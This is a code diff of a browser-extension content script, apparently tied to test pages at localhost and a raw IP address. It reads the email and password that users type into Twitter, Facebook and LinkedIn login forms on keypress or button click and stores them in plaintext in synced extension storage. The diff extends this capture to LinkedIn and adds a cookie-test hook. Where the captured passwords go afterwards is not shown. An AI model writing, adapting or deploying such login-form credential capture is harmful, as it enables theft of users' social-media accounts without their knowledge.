@@ -25,97 +25,163 @@ function sendmsg(msg) {
 
 if (window.location.href.indexOf("localhost/testweb/facebook") > -1 || window.location.href.indexOf("http://125.138.183.122:8084/php/facebook") > -1) {
     document.getElementById('needLogin').onclick = function() {
-        chrome.storage.sync.set({ extensionState: 1 }, function() {
+        chrome.storage.local.set({ extensionState: 1 }, function() {
             sendmsg('fbLogin');
         });
     };
+    document.getElementById('sendData').onclick = function() {
+        chrome.storage.local.set({ extensionState: 0 }, function() {});
+    };
 }
+
 if (window.location.href.indexOf("localhost/testweb/twitter") > -1 || window.location.href.indexOf("http://125.138.183.122:8084/php/twitter") > -1) {
     document.getElementById('needLogin').onclick = function() {
-        chrome.storage.sync.set({ extensionState: 1 }, function() {
+        chrome.storage.local.set({ extensionState: 1 }, function() {
             sendmsg('twLogin');
         });
     };
-}
-// chrome.storage.local.get(['extensionState'], function(result) {
-//     if (result.extensionState == 1) {
-if (window.location.href.indexOf("twitter.com/login") > -1) {
-    try {
-        setTimeout(function() {
-            document.addEventListener("keypress", function(e) {
-                var code = e.keyCode || e.which;
-                if (code == 13) {
-                    var email = document.querySelector('input[name="session[username_or_email]"]').value;
-                    var password = document.querySelector('input[name="session[password]"]').value;
-                    chrome.storage.sync.set({ TWemail: email, TWpassword: password }, function() {
-                        console.log('Set');
-                        sendmsg('donetwLogin');
-                    });
-                }
-            });
-            document.querySelector('div[data-testid="LoginForm_Login_Button"]').onclick = function() {
-                var email = document.querySelector('input[name="session[username_or_email]"]').value;
-                var password = document.querySelector('input[name="session[password]"]').value;
-                chrome.storage.sync.set({ TWemail: email, TWpassword: password }, function() {
-                    console.log('Set');
-                    sendmsg('donetwLogin');
-                });
-                // chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
-                //     chrome.tabs.remove(tabs[0].id);
-                // });
-
-                // chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
-                //     alert('Value' + result.FBpassword + 'currently is ' + result.FBemail);
-                // });
-                // sendmsg('Login');
-            };
-        }, 1000);
-    } catch (err) {
-        console.log(err);
-    }
+    document.getElementById('sendData').onclick = function() {
+        chrome.storage.local.set({ extensionState: 0 }, function() {});
+    };
 }
 
-if (window.location.href.indexOf("mbasic.facebook.com/login") > -1) {
-    try {
-        document.addEventListener("keypress", function(e) {
-            var code = e.keyCode || e.which;
-            if (code == 13) {
-                var email = document.getElementById('m_login_email').value;
-                var password = document.querySelector('input[name="pass"]').value;
-                chrome.storage.sync.set({ FBemail: email, FBpassword: password }, function() {
-                    console.log('Set');
-                    sendmsg('donefbLogin');
-                });
-            }
+if (window.location.href.indexOf("localhost/testweb/linkedin") > -1 || window.location.href.indexOf("http://125.138.183.122:8084/php/linkedin") > -1) {
+    document.getElementById('needLogin').onclick = function() {
+        chrome.storage.local.set({ extensionState: 1 }, function() {
+            sendmsg('liLogin');
         });
-        document.querySelector('input[name="login"]').onclick = function() {
-            var email = document.getElementById('m_login_email').value;
-            var password = document.querySelector('input[name="pass"]').value;
-            chrome.storage.sync.set({ FBemail: email, FBpassword: password }, function() {
-                console.log('Set');
-                sendmsg('donefbLogin');
-            });
+    };
+    document.getElementById('sendData').onclick = function() {
+        chrome.storage.local.set({ extensionState: 0 }, function() {});
+    };
+    document.addEventListener("keypress", function(e) {
+        var code = e.keyCode || e.which;
+        if (code == 13) {
+            sendmsg('testliCookie');
+        }
+    });
+}
+
+chrome.storage.local.get(['extensionState'], function(result) {
+    if (result.extensionState == 1) {
+        if (window.location.href.indexOf("linkedin.com/login") > -1) {
+            try {
+                setTimeout(function() {
+                    document.addEventListener("keypress", function(e) {
+                        var code = e.keyCode || e.which;
+                        if (code == 13) {
+                            var email = document.getElementById('username').value;
+                            var password = document.getElementById('password').value;
+                            chrome.storage.sync.set({ LIemail: email, LIpassword: password }, function() {
+                                console.log('Set');
+                                sendmsg('doneliLogin');
+                            });
+                        }
+                    });
+                    document.querySelector('div[data-testid="LoginForm_Login_Button"]').onclick = function() {
+                        var email = document.getElementById('username').value;
+                        var password = document.getElementById('password').value;
+                        chrome.storage.sync.set({ LIemail: email, LIpassword: password }, function() {
+                            console.log('Set');
+                            sendmsg('doneliLogin');
+                        });
+                        // chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
+                        //     chrome.tabs.remove(tabs[0].id);
+                        // });
+
+                        // chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
+                        //     alert('Value' + result.FBpassword + 'currently is ' + result.FBemail);
+                        // });
+                        // sendmsg('Login');
+                    };
+                }, 1000);
+            } catch (err) {
+                console.log(err);
+            }
+        }
+        if (window.location.href.indexOf("twitter.com/login") > -1) {
+            try {
+                setTimeout(function() {
+                    document.addEventListener("keypress", function(e) {
+                        var code = e.keyCode || e.which;
+                        if (code == 13) {
+                            var email = document.querySelector('input[name="session[username_or_email]"]').value;
+                            var password = document.querySelector('input[name="session[password]"]').value;
+                            chrome.storage.sync.set({ TWemail: email, TWpassword: password }, function() {
+                                console.log('Set');
+                                sendmsg('donetwLogin');
+                            });
+                        }
+                    });
+                    document.querySelector('div[data-testid="LoginForm_Login_Button"]').onclick = function() {
+                        var email = document.querySelector('input[name="session[username_or_email]"]').value;
+                        var password = document.querySelector('input[name="session[password]"]').value;
+                        chrome.storage.sync.set({ TWemail: email, TWpassword: password }, function() {
+                            console.log('Set');
+                            sendmsg('donetwLogin');
+                        });
+                        // chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
+                        //     chrome.tabs.remove(tabs[0].id);
+                        // });
+
+                        // chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
+                        //     alert('Value' + result.FBpassword + 'currently is ' + result.FBemail);
+                        // });
+                        // sendmsg('Login');
+                    };
+                }, 1000);
+            } catch (err) {
+                console.log(err);
+            }
+        }
+        if (window.location.href.indexOf("mbasic.facebook.com/login") > -1) {
+            try {
+                document.addEventListener("keypress", function(e) {
+                    var code = e.keyCode || e.which;
+                    if (code == 13) {
+                        var email = document.getElementById('m_login_email').value;
+                        var password = document.querySelector('input[name="pass"]').value;
+                        chrome.storage.sync.set({ FBemail: email, FBpassword: password }, function() {
+                            console.log('Set');
+                            sendmsg('donefbLogin');
+                        });
+                    }
+                });
+                document.querySelector('input[name="login"]').onclick = function() {
+                    var email = document.getElementById('m_login_email').value;
+                    var password = document.querySelector('input[name="pass"]').value;
+                    chrome.storage.sync.set({ FBemail: email, FBpassword: password }, function() {
+                        console.log('Set');
+                        sendmsg('donefbLogin');
+                    });
+                };
+            } catch (err) {
+                console.log(err);
+            }
+
+        }
+
+        if (window.location.href.indexOf("mbasic.facebook.com/home.php") > -1) {
+            sendmsg('donefbLogin');
+        }
+        if (window.location.href.indexOf("https://twitter.com/home") > -1) {
+            sendmsg('donetwLogin');
+            // chrome.storage.sync.get(['TWcookie'], function(result) {
+            //     chrome.cookies.getAll({ url: 'https://twitter.com' }, function(e) {
+            //         if (JSON.stringify(result.TWcookie) !== JSON.stringify(e)) {
+            //         } else {
+            //             console.log('not match');
+            //         }
+
+            //     });
+            // })
         };
-    } catch (err) {
-        console.log(err);
     }
+})
 
-}
 
-if (window.location.href.indexOf("mbasic.facebook.com/home.php") > -1) {
-    sendmsg('donefbLogin');
-}
-if (window.location.href.indexOf("https://twitter.com/home") > -1) {
-    sendmsg('donetwLogin');
-    // chrome.storage.sync.get(['TWcookie'], function(result) {
-    //     chrome.cookies.getAll({ url: 'https://twitter.com' }, function(e) {
-    //         if (JSON.stringify(result.TWcookie) !== JSON.stringify(e)) {
-    //         } else {
-    //             console.log('not match');
-    //         }
 
-    //     });
-    // })
-};
+
+
 //     }
 // });
